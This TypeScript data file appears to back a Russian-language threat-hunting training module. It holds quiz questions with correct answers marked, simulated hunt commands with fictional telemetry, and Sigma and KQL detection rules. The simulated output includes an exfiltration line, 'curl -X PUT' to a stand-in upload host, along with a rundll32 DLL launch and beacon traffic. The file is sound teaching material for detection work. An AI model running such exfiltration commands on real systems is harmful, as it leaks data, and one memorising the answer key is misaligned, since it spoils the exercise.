const option = (id: string, text: string, correct = false) => ({ id, text, correct });

export const huntCaseOverview = [
  { label: 'КОНТУР', value: 'Greylock / 30 days telemetry' },
  { label: 'АЛЕРТ', value: 'нет готового сигнала' },
  { label: 'ЦЕЛЬ', value: 'найти скрытую активность' },
  { label: 'РЕЖИМ', value: 'hypothesis-driven hunt' },
] as const;

export const huntArchitecture = [
  { id: 'idp', role: 'IDENTITY', title: 'IdP / VPN', subtitle: 'logons / tokens', address: 'identity.greylock.local' },
  { id: 'endpoint', role: 'ENDPOINT', title: 'EDR', subtitle: 'process / network', address: 'fleet: 84 hosts' },
  { id: 'dns', role: 'NETWORK', title: 'DNS / Proxy', subtitle: 'queries / egress', address: 'resolver + proxy' },
  { id: 'lake', role: 'DATA', title: 'Telemetry Lake', subtitle: '30 days / imperfect', address: 'hunt.greylock.local' },
] as const;

export const huntFoundationQuestions = [
  { id: 'hunt', label: 'Чем threat hunting отличается от triage готового алерта?', options: [
    option('hypothesis', 'Охота начинается с проверяемой гипотезы и ищет активность, которую существующие правила могли не заметить.', true),
    option('same', 'Ничем: охота всегда начинается с готового high-severity алерта.'),
    option('ioc', 'Охота сводится к поиску одного IP-адреса.'),
  ]},
  { id: 'ttp', label: 'Почему TTP полезнее одиночного IOC?', options: [
    option('behavior', 'Поведение меняется медленнее конкретных адресов и хэшей и позволяет искать семейство действий.', true),
    option('perfect', 'TTP всегда однозначно доказывает атаку.'),
    option('replace', 'TTP полностью заменяет исходные журналы.'),
  ]},
  { id: 'hypothesis', label: 'Как выглядит рабочая гипотеза?', options: [
    option('testable', 'Она связывает технику, актив, ожидаемое наблюдение и нужные источники данных.', true),
    option('vague', 'В сети, возможно, есть хакер.'),
    option('conclusion', 'Учётка buildbot точно украдена.'),
  ]},
  { id: 'gap', label: 'Что делать, если нужного поля нет в телеметрии?', options: [
    option('gap', 'Зафиксировать telemetry gap, найти альтернативный источник и исправить сбор данных.', true),
    option('invent', 'Считать отсутствующее поле безопасным.'),
    option('close', 'Закрыть hunt без отметки ограничения.'),
  ]},
] as const;

export const huntGuidedObjectives = [
  { id: 'baseline', title: 'Построй baseline сетевых входов', command: 'hunt baseline --source auth --group-by user,host,src --days 30', output: 'baseline built: users=71 hosts=84 sources=219\nrare combinations=12\nservice accounts with interactive logon=1' },
  { id: 'rare-logon', title: 'Найди редкий интерактивный вход сервисной учётки', command: 'hunt query "event=4624 logon_type=10 account_type=service" --rare', output: '2029-06-18T02:14:11Z user=svc_reports host=OPS-JUMP-03 src=198.51.100.73 logon_type=10 frequency_30d=1' },
  { id: 'process', title: 'Проверь процессы после входа', command: 'hunt query "host=OPS-JUMP-03 time=02:14..02:30 process=*" --tree', output: 'winlogon.exe\n  userinit.exe\n    powershell.exe -NoProfile -File C:\\ProgramData\\inventory.ps1\n      rundll32.exe C:\\ProgramData\\diag.dll,Run' },
  { id: 'dns', title: 'Проверь сетевое поведение узла', command: 'hunt query "host=OPS-JUMP-03 dns=* proxy=*" --timeline', output: '02:18:02 dns q=telemetry-cache.test age=2d\n02:18:04 proxy dst=203.0.113.126:443 bytes_out=884120 process=rundll32.exe\n02:23:41 repeat interval=337s' },
  { id: 'coverage', title: 'Проверь покрытие нужных техник', command: 'hunt telemetry gaps --techniques T1078,T1059.001,T1218.011,T1041', output: 'T1078 identity=covered\nT1059.001 process_command_line=covered\nT1218.011 module_load=missing on 27 hosts\nT1041 proxy_bytes=covered, process attribution partial' },
] as const;

export const huntHypothesisQuestions = [
  { id: 'statement', label: 'Какая гипотеза соответствует фактам?', options: [
    option('valid', 'Если сервисная учётка используется для редкого RDP-входа, затем запускает PowerShell и signed binary с новым внешним каналом, это может быть скрытая интерактивная компрометация.', true),
    option('weak', 'Любой PowerShell означает заражение.'),
    option('final', '203.0.113.126 принадлежит конкретной группировке — это доказано.'),
  ]},
  { id: 'mapping', label: 'Какое ATT&CK-сопоставление уместно?', options: [
    option('map', 'Valid Accounts, PowerShell, Rundll32 и Exfiltration Over C2 Channel.', true),
    option('impact', 'Data Destruction и Inhibit System Recovery.'),
    option('none', 'ATT&CK нельзя применять к наблюдаемому поведению.'),
  ]},
] as const;

export const sigmaStarter = `title: Greylock suspicious service account interactive chain
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    User|endswith: '$'
  condition: selection
falsepositives:
  - Unknown
level: medium
`;

export const sigmaSolution = `title: Greylock service account interactive PowerShell to Rundll32
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  service_user:
    User|contains: 'svc_'
  interactive_chain:
    ParentImage|endswith: '\\powershell.exe'
    Image|endswith: '\\rundll32.exe'
    CommandLine|contains: '.dll,Run'
  filter_admin:
    CommandLine|contains: '\\approved\\'
  condition: service_user and interactive_chain and not filter_admin
falsepositives:
  - Approved maintenance outside the standard path
level: high
`;

export const kqlSolution = `DeviceProcessEvents
| where Timestamp > ago(30d)
| where AccountName startswith "svc_"
| where FileName =~ "rundll32.exe"
| where InitiatingProcessFileName =~ "powershell.exe"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Hosts=dcount(DeviceName), Events=count() by AccountName, ProcessCommandLine
| where Hosts <= 2 and Events < 10
| order by FirstSeen desc`;

export const huntTuningQuestions = [
  { id: 'fp', label: 'Как уменьшить false positives без слепой allowlist?', options: [
    option('context', 'Добавить контекст: тип учётки, parent-child chain, путь, распространённость, время и approved maintenance source.', true),
    option('disable', 'Отключить правило после первого ложного срабатывания.'),
    option('hash', 'Искать только один известный хэш.'),
  ]},
  { id: 'test', label: 'Как проверить аналитику?', options: [
    option('replay', 'Прогнать на исторических данных, наборе позитивных/негативных примеров и контролируемой эмуляции.', true),
    option('prod', 'Сразу поставить блокировку на всех хостах.'),
    option('one', 'Проверить только на одном событии.'),
  ]},
  { id: 'gap', label: 'Что делать с 27 хостами без module-load telemetry?', options: [
    option('fix', 'Зарегистрировать gap, приоритизировать критичные хосты и развернуть нужный сбор с контролем качества.', true),
    option('ignore', 'Считать их чистыми.'),
    option('delete', 'Удалить их из выборки и отчёта.'),
  ]},
] as const;

export const huntIndependentCommands = [
  { id: 'hypothesis', command: 'hunt query "account=backup_sync auth=success host!=BACKUP-*" --days 45', output: '2029-06-19T04:11:22Z account=backup_sync host=DEV-BUILD-07 src=10.44.18.91 method=certificate frequency_45d=1' },
  { id: 'process', command: 'hunt query "host=DEV-BUILD-07 time=04:11..04:25 process=*" --tree', output: 'sshd(991)\n  bash(8121)\n    python3(8144) /tmp/.cache/check.py\n      curl(8198) -X PUT https://artifact-drop.test/upload' },
  { id: 'network', command: 'hunt query "host=DEV-BUILD-07 dst=artifact-drop.test" --timeline', output: '04:14:08 dns artifact-drop.test first_seen=1d\n04:14:10 tls bytes_out=2918841 process=curl user=backup_sync' },
  { id: 'scope', command: 'hunt query "account=backup_sync OR domain=artifact-drop.test" --group-by host', output: 'DEV-BUILD-07 events=14\nBACKUP-02 events=221 expected=true\nother hosts=0' },
] as const;

export const huntIndependentQuestions = [
  { id: 'assessment', label: 'Какой вывод выдерживает проверку?', options: [
    option('confirmed', 'backup_sync использован на нетипичном build-host; после входа запущен Python из /tmp и выполнена крупная выгрузка на новый домен.', true),
    option('malware', 'check.py точно является конкретным вредоносом.'),
    option('clean', 'Учётка сервисная, значит активность легитимна.'),
  ]},
  { id: 'limit', label: 'Что остаётся неизвестным?', options: [
    option('unknown', 'Как сертификат оказался у оператора и какие данные были внутри 2.9 MB.', true),
    option('none', 'Всё уже доказано.'),
    option('owner', 'Имя реального человека за доменом.'),
  ]},
] as const;

export const huntReportSections = [
  { id: 'finding', label: 'Основное наблюдение', options: [
    option('chain', 'Редкие интерактивные входы сервисных учёток связаны с нетипичными process chains и внешней передачей данных.', true),
    option('all', 'Все сервисные учётки скомпрометированы.'),
    option('ip', 'Единственный надёжный индикатор — один IP.'),
  ]},
  { id: 'coverage', label: 'Ограничение данных', options: [
    option('gap', 'На части хостов отсутствует module-load telemetry, а attribution proxy неполная; уверенность ограничена.', true),
    option('perfect', 'Телеметрия полная.'),
    option('hide', 'Пробелы не нужно включать в отчёт.'),
  ]},
  { id: 'action', label: 'Следующий шаг', options: [
    option('operationalize', 'Передать находки в IR, развернуть протестированную аналитику, закрыть gaps и повторить hunt после накопления данных.', true),
    option('block-all', 'Отключить все сервисные учётки без оценки.'),
    option('close', 'Закрыть работу после первого совпадения.'),
  ]},
] as const;
